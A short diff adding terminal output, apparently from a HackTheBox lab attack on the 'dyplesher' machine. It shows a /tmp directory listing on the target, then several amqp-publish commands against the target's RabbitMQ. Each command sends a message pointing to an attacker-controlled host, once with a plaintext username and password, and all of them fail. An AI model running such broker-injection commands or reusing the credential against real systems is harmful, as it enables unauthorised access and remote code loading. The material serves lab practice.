@@ -1,0 +1,33 @@
+MinatoTW@dyplesher:/tmp$ ls -alt
+total 276
+drwxrwxrwt 16 root     root       4096 Nov  7 18:35 .
+-rw-r--r--  1 root     root          0 Nov  7 18:35 test
+-rw-------  1 MinatoTW MinatoTW 211924 Nov  7 18:30 out.pcapng
+drwx------  2 root     root       4096 Nov  7 14:28 vmware-root_835-3988097475
+drwxr-xr-x  2 MinatoTW MinatoTW   4096 Nov  7 14:25 jna--1301598419
+drwx------  3 root     root       4096 Nov  7 14:25 snap.lxd
+drwxr-xr-x  2 MinatoTW MinatoTW   4096 Nov  7 14:25 hsperfdata_MinatoTW
+drwx------  3 root     root       4096 Nov  7 14:25 systemd-private-8b096ae5bc5c4e00b06ce86998942d98-apache2.service-tRobff
+drwx------  3 root     root       4096 Nov  7 14:25 systemd-private-8b096ae5bc5c4e00b06ce86998942d98-gogs.service-rp8xUe
+drwx------  3 root     root       4096 Nov  7 14:25 systemd-private-8b096ae5bc5c4e00b06ce86998942d98-systemd-logind.service-dx6Ydfdrwx------  3 root     root       4096 Nov  7 14:25 systemd-private-8b096ae5bc5c4e00b06ce86998942d98-systemd-resolved.service-u3cD4h
+drwx------  3 root     root       4096 Nov  7 14:25 systemd-private-8b096ae5bc5c4e00b06ce86998942d98-systemd-timesyncd.service-32ps9f
+drwxrwxrwt  2 root     root       4096 Nov  7 14:25 .font-unix
+drwxrwxrwt  2 root     root       4096 Nov  7 14:25 .ICE-unix
+drwxrwxrwt  2 root     root       4096 Nov  7 14:25 .Test-unix
+drwxrwxrwt  2 root     root       4096 Nov  7 14:25 .X11-unix
+drwxrwxrwt  2 root     root       4096 Nov  7 14:25 .XIM-unix
+drwxr-xr-x 20 root     root       4096 Apr 23  2020 ..
+
+
+
+╭─kali@kali ~/htb-tools 
+╰─# ./amqp-publish.linux-amd64 --uri="amqp://10.10.10.190:5672" --body="http://10.10.14.35:11211"
+exchange and routing-key cannot both be blank
+╭─kali@kali ~/htb-tools 
+╰─./amqp-publish.linux-amd64 --uri="amqp://10.10.10.190:5672" --body="http://10.10.14.35:11211" --exchange="plugin_data" --routing-key="plugin_data"
+Exception (403) Reason: "username or password not allowed"
+
+
+╭─kali@kali ~/htb-tools 
+╰─# ./amqp-publish.linux-amd64 --uri="amqp://felamos:tieb0graQueg@10.10.10.190:5672/" --body="http://10.10.14.35:11211" --exchange="plugin_data" --routing-key="plugin_data"
+Exception (403) Reason: "username or password not allowed"
